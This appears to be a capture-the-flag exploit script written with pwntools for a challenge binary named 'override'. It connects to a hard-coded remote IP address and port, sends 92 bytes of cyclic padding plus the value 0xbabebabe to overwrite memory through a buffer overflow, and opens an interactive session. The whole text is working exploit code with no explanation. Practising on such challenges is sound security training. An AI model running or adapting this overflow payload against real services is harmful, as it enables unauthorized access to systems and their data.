from pwn import *

# conn = process('./override')
conn = remote('130.192.5.212', 1950)
conn.recvuntil(b'is 0.', drop=True)

line = cyclic(92)
line += bytes.fromhex('0xbabebabe'[2:])[::-1]

conn.sendline(line)
conn.interactive()
